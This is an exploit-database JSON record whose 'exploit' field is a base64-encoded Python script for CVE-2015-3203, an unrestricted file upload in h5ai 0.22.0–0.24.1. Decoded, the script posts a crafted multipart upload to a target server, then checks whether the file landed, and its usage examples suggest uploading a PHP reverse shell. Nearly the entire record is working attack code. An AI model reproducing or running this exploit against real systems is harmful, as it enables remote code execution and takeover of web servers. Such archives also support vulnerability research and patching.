{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCiMgRXhwbG9pdCBUaXRsZTogaDVhaSA8IDAuMjUuMCBVbnJlc3RyaWN0ZWQgRmlsZSBVcGxvYWQNCiMgRGF0ZTogMjEgU2VwdGVtYmVyIDIwMTUNCiMgRXhwbG9pdCBBdXRob3I6IHJUaGVvcnkNCiMgVmVuZG9yIEhvbWVwYWdlOiBodHRwczovL2xhcnNqdW5nLmRlL2g1YWkvDQojIFZ1bG5lcmFibGUgU29mdHdhcmUgTGluazogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTQwMjA4MDYzNjEzL2h0dHA6Ly9yZWxlYXNlLmxhcnNqdW5nLmRlL2g1YWkvaDVhaS0wLjI0LjAuemlwDQojIFZ1bG5lcmFibGUgVmVyc2lvbnM6IDAuMjIuMCAtIDAuMjQuMQ0KIyBUZXN0ZWQgb246IDAuMjQuMCBydW5uaW5nIG9uIEFwYWNoZQ0KIyBDVkUgOiAyMDE1LTMyMDMNCg0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IHVybGxpYjINCmltcG9ydCBzb2NrZXQNCmltcG9ydCBvcw0KaW1wb3J0IGdldG9wdA0KaW1wb3J0IHN5cw0KDQojIEdsb2JhbHMgd2l0aCBkZWZhdWx0IG9wdGlvbnMNCnVybCA9ICcnDQpwYXRoID0gJy8nDQpmaWxlTmFtZSA9ICcnDQpmaWxlUGF0aCA9ICcnDQp2ZXJib3NlTW9kZSA9IEZhbHNlDQoNCmRlZiBoZWFkZXIoKToNCiAgICBwcmludCAnKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKycNCiAgICBwcmludCAnfCBGaWxlIHVwbG9hZCBleHBsb2l0IGZvciBoNWFpIHYwLjIyLjAgLSAwLjI0LjEgfCcNCiAgICBwcmludCAnfCAgU2VlIENWRS0yMDE1LTMyMDMgZm9yIHZ1bG5lcmFiaWxpdHkgZGV0YWlscyAgfCcNCiAgICBwcmludCAnKy0tLS0tLS0tLS0tLS0tLS0tLS0gclRoZW9yeSAtLS0tLS0tLS0tLS0tLS0tLS0tKycNCg0KZGVmIHVzYWdlKCk6DQogICAgcHJpbnQgDQogICAgcHJpbnQgJ1VzYWdlOiAlcyAtdCB0YXJnZXRfdXJsIC1mIHVwbG9hZF9maWxlJyAlIG9zLnBhdGguYmFzZW5hbWUoX19maWxlX18pDQogICAgcHJpbnQgJy10IC0tdGFyZ2V0ICAgICAgICAgICAtIFRoZSBVUkwgdG8gY29ubmVjdCB0bycNCiAgICBwcmludCAnICAgICAgICAgICAgICAgICAgICAgICAgZXg6IGh0dHA6Ly9leGFtcGxlLmNvbScNCiAgICBwcmludCAnLWYgLS1maWxlICAgICAgICAgICAgIC0gVGhlIGZpbGUgdG8gdXBsb2FkJw0KICAgIHByaW50ICcgICAgICAgICAgICAgICAgICAgICAgICBleDogcGhwLXJldmVyc2Utc2hlbGwucGhwJw0KICAgIHByaW50ICctcCAtLXBhdGggICAgICAgICAgICAgLSBUaGUgcGF0aCB0byB1cGxvYWQgdG8nDQogICAgcHJpbnQgJyAgICAgICAgICAgICAgICAgICAgICAgIERlZmF1bHQgaXMgXCcvXCcnDQogICAgcHJpbnQgJy12IC0tdmVyYm9zZSAgICAgICAgICAtIEVuYWJsZSBtb3JlIHZlcmJvc2Ugb3V0cHV0Jw0KICAgIHByaW50IA0KICAgIHByaW50ICdFeGFtcGxlczonDQogICAgcHJpbnQgJyVzIC10IGh0dHA6Ly9leGFtcGxlLmNvbTo4MDgwIC1mIHBocC1yZXZlcnNlLXNoZWxsLnBocCcgJSBvcy5wYXRoLmJhc2VuYW1lKF9fZmlsZV9fKQ0KICAgIHByaW50ICclcyAtdCBodHRwOi8vMTkyLjE2OC4xLjEwMCAtZiBwaHAtcmV2ZXJzZS1zaGVsbC5waHAgLXAgL2Rpci8nICUgb3MucGF0aC5iYXNlbmFtZShfX2ZpbGVfXykNCiAgICBzeXMuZXhpdCgwKQ0KICAgIA0KZGVmIG1haW4oKToNCiAgICBnbG9iYWwgdXJsDQogICAgZ2xvYmFsIHBhdGgNCiAgICBnbG9iYWwgZmlsZU5hbWUNCiAgICBnbG9iYWwgZmlsZVBhdGgNCiAgICBnbG9iYWwgdmVyYm9zZU1vZGUNCiAgICANCiAgICBoZWFkZXIoKQ0KICAgIA0KICAgIGlmIG5vdCBsZW4oc3lzLmFyZ3ZbNDpdKToNCiAgICAgICAgcHJpbnQgJ1stXSBJbmNvcnJlY3QgbnVtYmVyIG9mIGFyZ3VtZW50cycNCiAgICAgICAgdXNhZ2UoKQ0KICAgICAgICANCiAgICB0cnk6DQogICAgICAgIG9wdHMsIGFyZ3MgPSBnZXRvcHQuZ2V0b3B0KHN5cy5hcmd2WzE6XSwiaHQ6ZjpwOnYiLCBbImhlbHAiLCJ0YXJnZXQiLCJmaWxlIiwicGF0aCIsInZlcmJvc2UiXSkNCiAgICBleGNlcHQgZ2V0b3B0LkdldG9wdEVycm9yIGFzIGVycjoNCiAgICAgICAgcHJpbnQgc3RyKGVycikNCiAgICAgICAgdXNhZ2UoKQ0KDQogICAgZm9yIG8sYSBpbiBvcHRzOg0KICAgICAgICBpZiBvIGluICgnLWgnLCctLWhlbHAnKToNCiAgICAgICAgICAgIHVzYWdlKCkNCiAgICAgICAgZWxpZiBvIGluICgnLXQnLCctLXRhcmdldCcpOg0KICAgICAgICAgICAgdXJsID0gYQ0KICAgICAgICBlbGlmIG8gaW4gKCctZicsJy0tZmlsZScpOg0KICAgICAgICAgICAgZmlsZU5hbWUgPSBhDQogICAgICAgIGVsaWYgbyBpbiAoJy1wJywnLS1wYXRoJyk6DQogICAgICAgICAgICBwYXRoID0gYQ0KICAgICAgICBlbGlmIG8gaW4gKCctdicsJy0tdmVyYm9zZScpOg0KICAgICAgICAgICAgdmVyYm9zZU1vZGUgPSBUcnVlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBhc3NlcnQgRmFsc2UsIlVuaGFuZGxlZCBPcHRpb24iDQogICAgICAgIA0KICAgICMgVGVzdCB0YXJnZXQgVVJMLCB0YXJnZXQgZmlsZSwgYW5kIHBhdGggaW5wdXRzIGZvciB2YWxpZGl0eQ0KICAgIGlmIG5vdCB1cmwuc3RhcnRzd2l0aCgnaHR0cCcpOg0KICAgICAgICBwcmludCAnWy1dIEVycm9yOiBUYXJnZXQgVVJMIG11c3Qgc3RhcnQgd2l0aCBodHRwOi8vIG9yIGh0dHBzOi8vJw0KICAgICAgICB1c2FnZSgpDQogICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKGZpbGVOYW1lKToNCiAgICAgICAgcHJpbnQgJ1stXSBFcnJvcjogRmlsZSBkb2VzIG5vdCBhcHBlYXIgdG8gZXhpc3QnDQogICAgICAgIHVzYWdlKCkNCiAgICBpZiBub3QgKHBhdGguc3RhcnRzd2l0aCgnLycpIGFuZCBwYXRoLmVuZHN3aXRoKCcvJykpOg0KICAgICAgICBwcmludCAnWy1dIEVycm9yOiBQYXRoIG11c3Qgc3RhcnQgYW5kIGVuZCB3aXRoIGEgXCcvXCcnDQogICAgICAgIHVzYWdlKCkNCiAgICANCiAgICAjIERldGVybWluZSB0YXJnZXQgaG9zdCwgd2hpY2ggaXMgdGhlIFVSTCBtaW51cyB0aGUgbGVhZGluZyBwcm90b2NvbA0KICAgIGlmIHVybC5maW5kKCdodHRwOi8vJykgIT0gLTE6DQogICAgICAgIGhvc3QgPSB1cmxbNzpdDQogICAgZWxpZiB1cmwuZmluZCgnaHR0cHM6Ly8nKSAhPSAtMToNCiAgICAgICAgaG9zdCA9IHVybFs4Ol0NCiAgICBlbHNlOg0KICAgICAgICBob3N0ID0gdXJsDQogICAgDQogICAgIyBTdG9yZSB0aGUgY29udGVudHMgb2YgdGhlIHVwbG9hZCBmaWxlIGludG8gYSBzdHJpbmcNCiAgICBwcmludCAnWytdIFJlYWRpbmcgdXBsb2FkIGZpbGUnDQogICAgZiA9IG9wZW4oZmlsZU5hbWUsJ3InKQ0KICAgIGZpbGVDb250ZW50cyA9IGYucmVhZCgpDQogICAgZi5jbG9zZSgpDQogICAgDQogICAgTVBGQiA9ICdtdWx0aXBhcnRmb3JtYm91bmRhcnkxNDQyNzg0NjY5MDMwJyAjIGNvbnN0YW50IHN0cmluZyB1c2VkIGZvciBNSU1FIGluZm8NCg0KICAgICMgSGVhZGVyIGluZm9ybWF0aW9uLiBDb250ZW50LUxlbmd0aCBub3QgbmVlZGVkLg0KICAgIGh0dHBfaGVhZGVyID0gew0KICAgICAgICAiSG9zdCIgOiBob3N0LA0KICAgICAgICAiVXNlci1BZ2VudCIgOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQ7IHJ2OjM4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMzguMCIsDQogICAgICAgICJBY2NlcHQiIDogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOCIsDQogICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiIDogImVuLXVzLGVuO3E9MC41IiwNCiAgICAgICAgIkFjY2VwdC1FbmNvZGluZyIgOiAiZ3ppcCwgZGVmbGF0ZSIsDQogICAgICAgICJDb250ZW50LXR5cGUiIDogIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PS0tLS0tLSIgKyBNUEZCLA0KICAgICAgICAiWC1SZXF1ZXN0ZWQtV2l0aCIgOiAiWE1MSHR0cFJlcXVlc3QiLA0KICAgICAgICAiUmVmZXJlciIgOiB1cmwgKyBwYXRoLCANCiAgICAgICAgIkNvbm5lY3Rpb24iIDogImtlZXAtYWxpdmUiDQogICAgfQ0KDQogICAgIyBQT1NUIHBhcmFtZXRlciBmb3IgZmlsZSB1cGxvYWQNCiAgICBwYXlsb2FkICA9ICctLS0tLS0tLScrTVBGQisnXHJcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iYWN0aW9uIlxyXG5cclxudXBsb2FkXHJcbicNCiAgICBwYXlsb2FkICs9ICctLS0tLS0tLScrTVBGQisnXHJcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iaHJlZiJcclxuXHJcbicrcGF0aCsnXHJcbicNCiAgICBwYXlsb2FkICs9ICctLS0tLS0tLScrTVBGQisnXHJcbkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0idXNlcmZpbGUiOyBmaWxlbmFtZT0iJytmaWxlTmFtZSsnIlxyXG5Db250ZW50LVR5cGU6IFxyXG5cclxuJytmaWxlQ29udGVudHMrJ1xyXG4nDQogICAgcGF5bG9hZCArPSAnLS0tLS0tLS0nK01QRkIrJy0tXHJcbicNCg0KICAgIHNvY2tldC5zZXRkZWZhdWx0dGltZW91dCg1KQ0KICAgIG9wZW5lciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKCkNCiAgICByZXEgPSB1cmxsaWIyLlJlcXVlc3QodXJsLCBwYXlsb2FkLCBodHRwX2hlYWRlcikNCg0KICAgICMgc3VibWl0IHJlcXVlc3QgYW5kIHByaW50IG91dHB1dC4gRXhwZWN0ZWQ6ICJjb2RlIDAiDQogICAgdHJ5Og0KICAgICAgICBwcmludCAnWytdIFNlbmRpbmcgZXhwbG9pdCBQT1NUIHJlcXVlc3QnDQogICAgICAgIHJlcyA9IG9wZW5lci5vcGVuKHJlcSkNCiAgICAgICAgaHRtbCA9IHJlcy5yZWFkKCkNCiAgICAgICAgaWYgdmVyYm9zZU1vZGU6IHByaW50ICdbK10gU2VydmVyIHJldHVybmVkOiAnICsgaHRtbA0KICAgIGV4Y2VwdDoNCiAgICAgICAgcHJpbnQgJ1stXSBTb2NrZXQgdGltZWQgb3V0LCBidXQgaXQgbWlnaHQgc3RpbGwgaGF2ZSB3b3JrZWQuLi4nDQoNCiAgICAjIGNsb3NlIHRoZSBjb25uZWN0aW9uDQogICAgb3BlbmVyLmNsb3NlKCkNCg0KICAgICMgTGFzdCBzdGVwOiBjaGVjayB0byBzZWUgaWYgdGhlIGZpbGUgdXBsb2FkZWQgKHBlcmZvcm1lZCBvdXRzaWRlIG9mIHRoaXMgZnVuY3Rpb24pDQogICAgZmlsZVBhdGggPSB1cmwgKyBwYXRoICsgZmlsZU5hbWUNCiAgICBwcmludCAnWytdIENoZWNraW5nIHRvIHNlZSBpZiB0aGUgZmlsZSB1cGxvYWRlZDonDQogICAgcHJpbnQgJ1srXSAnICsgZmlsZVBhdGggDQoNCmRlZiBwb3N0Q2hlY2soKToNCiAgICAjIENoZWNrIHRvIHNlZSBpZiB0aGUgZmlsZSBleGlzdHMNCiAgICAjIFRoaXMgbWF5IHdvcmsgbm93IHRoYXQgZXZlcnl0aGluZyBmcm9tIG1haW4oKSB3YXMgdG9ybiBkb3duDQogICAgZ2xvYmFsIGZpbGVQYXRoDQogICAgdHJ5Og0KICAgICAgICB1cmxsaWIyLnVybG9wZW4oZmlsZVBhdGgpDQogICAgICAgIHByaW50ICdbK10gRmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVsbHkhJw0KICAgIGV4Y2VwdCB1cmxsaWIyLkhUVFBFcnJvciwgZToNCiAgICAgICAgcHJpbnQgJ1stXSBGaWxlIGRpZCBub3QgYXBwZWFyIHRvIHVwbG9hZCcNCiAgICBleGNlcHQgdXJsbGliMi5VUkxFcnJvciwgZToNCiAgICAgICAgcHJpbnQgJ1stXSBGaWxlIGRpZCBub3QgYXBwZWFyIHRvIHVwbG9hZCcNCiAgICANCm1haW4oKQ0KcG9zdENoZWNrKCk=", 
    "filename": "platforms/php/webapps/38256.py", 
    "id": "38256", 
    "cves": [
        "CVE-2015-3203"
    ]
}